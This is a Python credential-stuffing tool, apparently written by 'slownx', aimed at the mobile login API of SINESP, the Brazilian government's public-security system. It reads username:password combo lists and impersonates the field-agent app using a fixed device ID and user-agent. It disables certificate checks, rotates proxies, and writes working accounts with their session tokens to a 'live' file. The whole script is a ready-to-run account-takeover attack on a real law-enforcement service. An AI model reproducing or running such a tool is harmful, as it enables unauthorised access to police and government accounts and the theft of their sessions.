#!/usr/bin/env python3
import os
import sys
import asyncio
import time
import json
import random
import requests
import urllib3
from colorama import init

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

DB_FILE     = sys.argv[1] if len(sys.argv) > 1 else 'resul.txt'
DELIMITADOR = sys.argv[2] if len(sys.argv) > 2 else ':'

LOGIN_URL = 'https://seguranca.sinesp.gov.br/sinesp-seguranca/api/sessao_autenticada/mobile'

HEADERS = {
    'content-type':    'application/json; charset=UTF-8',
    'accept-encoding': 'gzip',
    'user-agent':      'okhttp/3.14.9',
}

DISPOSITIVO = '2412DPC0AG'
INSTALACAO  = 'ed5f8007-7d67-409f-afce-2e8fc7e7e059'

def green(t):  return f"\033[92m{t}\033[0m"
def red(t):    return f"\033[91m{t}\033[0m"
def orange(t): return f"\033[38;5;208m{t}\033[0m"
def yellow(t): return f"\033[93m{t}\033[0m"
def cyan(t):   return f"\033[96m{t}\033[0m"

def _load_proxies(path='proxys.txt'):
    try:
        with open(path, 'r') as f:
            return [l.strip() for l in f if l.strip()]
    except FileNotFoundError:
        return []

_proxy_list = _load_proxies()

def _get_proxy():
    if not _proxy_list:
        return None
    p = random.choice(_proxy_list)
    return {'http': f'http://{p}', 'https': f'http://{p}'}

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""\033[96m\033[1m
  ██████╗██╗      ██████╗ ██╗    ██╗███╗  ██╗██╗  ██╗
 ██╔════╝██║     ██╔═══██╗██║    ██║████╗ ██║╚██╗██╔╝
 ╚█████╗ ██║     ██║   ██║██║ █╗ ██║██╔██╗██║ ╚███╔╝
  ╚═══██╗██║     ██║   ██║██║███╗██║██║╚████║ ██╔██╗
 ██████╔╝███████╗╚██████╔╝╚███╔███╔╝██║ ╚███║██╔╝ ██╗
 ╚═════╝ ╚══════╝ ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚══╝╚═╝  ╚═╝
\033[0m\033[2m  ──────────────── sinesp checker · by slownx ───────────\033[0m
""")


class LoginChecker:
    def __init__(self):
        self.approved    = 0
        self.rejected    = 0
        self.nvinculado  = 0
        self.total       = 0
        self.start_time  = None

    def exibir_status(self):
        elapsed = time.time() - self.start_time if self.start_time else 0
        checked = self.approved + self.rejected + self.nvinculado
        speed   = checked / elapsed if elapsed > 0 else 0
        print(f"  \033[2m[{checked}/{self.total}] live:{self.approved} die:{self.rejected} n.vin:{self.nvinculado} vel:{speed:.1f}/s\033[0m")

    def _append(self, filename, content):
        try:
            with open(filename, 'a', encoding='utf-8') as f:
                f.write(content + '\n')
        except Exception:
            pass

    def load_logins(self, path=DB_FILE):
        try:
            with open(path, 'r', encoding='utf-8') as f:
                lines = [l.strip() for l in f if l.strip() and DELIMITADOR in l]
        except FileNotFoundError:
            return []

        users, seen = [], set()
        for line in lines:
            user, pwd = line.split(DELIMITADOR, 1)
            user = user.strip()
            pwd  = pwd.strip()
            # limpa CPF deixando só dígitos se tiver 11 dígitos
            digits = ''.join(filter(str.isdigit, user))
            if len(digits) == 11:
                user = digits
            key = f"{user}:{pwd}"
            if key not in seen:
                seen.add(key)
                users.append({'username': user, 'password': pwd})
        return users

    def check(self, user_data):
        username = user_data['username']
        password = user_data['password']

        try:
            import urllib3, gzip as gzip_mod
            body = json.dumps({
                'aplicativo': 'APP_AGENTE_CAMPO',
                'dispositivo': DISPOSITIVO,
                'instalacao':  INSTALACAO,
                'senha':       password,
                'usuario':     username,
            }, separators=(',', ':')).encode('utf-8')

            http = urllib3.HTTPSConnectionPool(
                'seguranca.sinesp.gov.br', port=443,
                cert_reqs='CERT_NONE', assert_hostname=False,
                timeout=urllib3.Timeout(connect=15, read=30),
            )

            resp = http.urlopen(
                'POST',
                '/sinesp-seguranca/api/sessao_autenticada/mobile',
                body=body,
                headers={
                    'host':             'seguranca.sinesp.gov.br',
                    'content-type':     'application/json; charset=UTF-8',
                    'content-length':   str(len(body)),
                    'accept-encoding':  'gzip',
                    'user-agent':       'okhttp/3.14.9',
                },
                preload_content=True,
            )

            raw = resp.data
            if resp.headers.get('content-encoding') == 'gzip':
                raw = gzip_mod.decompress(raw)
            text = raw.decode('utf-8', errors='replace')

            if 'MOB411' in text:
                print(f"  {red('[DIE]')} \033[2m[MOB411] {username}:{password}\033[0m")
                self._append('die_sinesp.txt', f"{username}:{password}")
                return 'die'

            if 'Usuário não vinculado ao sistema' in text:
                print(f"  {orange('[N.VIN]')} \033[2m[N.VINCULADO] {username}:{password}\033[0m")
                self._append('nvinculado_sinesp.txt', f"{username}:{password}")
                return 'nvinculado'

            if resp.status == 200:
                try:
                    data  = json.loads(text)
                    token = data.get('token')
                    if token and token != 'null':
                        saida = f"[LIVE] {username}:{password} | token:{token}"
                        self._append('live_sinesp.txt', saida)
                        print(green(f"  {saida}"))
                        return 'live'
                except Exception:
                    pass

            self._append('die_sinesp.txt', f"{username}:{password}")
            return 'die'

        except Exception as e:
            print(f"  \033[2m[ERRO] {username} → {e}\033[0m")
            self._append('die_sinesp.txt', f"{username}:{password}")
            return 'die'

    def process_batch(self, batch):
        for u in batch:
            result = self.check(u)
            if result == 'live':
                self.approved += 1
            elif result == 'nvinculado':
                self.nvinculado += 1
            else:
                self.rejected += 1
            self.exibir_status()
            time.sleep(1)

    async def main(self):
        banner()
        print(cyan(f'  arquivo  {DB_FILE}\n'))

        users = self.load_logins()
        if not users:
            print(red('  Nenhum login encontrado!'))
            return

        self.total      = len(users)
        self.start_time = time.time()

        print(green(f"  logins únicos: {len(users)}"))
        print(yellow("  iniciando...\n"))

        batch_size    = 500
        total_batches = (len(users) + batch_size - 1) // batch_size

        for i in range(total_batches):
            batch = users[i * batch_size:(i + 1) * batch_size]
            print(yellow(f"  lote {i+1}/{total_batches} ({len(batch)} logins)"))
            self.process_batch(batch)
            if i < total_batches - 1:
                await asyncio.sleep(0.5)

        elapsed = time.time() - self.start_time
        checked = self.approved + self.rejected
        speed   = checked / elapsed if elapsed > 0 else 0

        print(green(f'\n  CONCLUÍDO!'))
        print(green(f'  lives:      {self.approved}'))
        print(red(f'  die:        {self.rejected}'))
        print(orange(f'  n.vinc:     {self.nvinculado}'))
        print(cyan(f'  vel:        {speed:.1f}/s  tempo: {elapsed:.1f}s'))


if __name__ == '__main__':
    checker = LoginChecker()
    try:
        asyncio.run(checker.main())
    except KeyboardInterrupt:
        print(yellow('\n  interrompido.'))
    except Exception as e:
        print(red(f'  erro: {e}'))
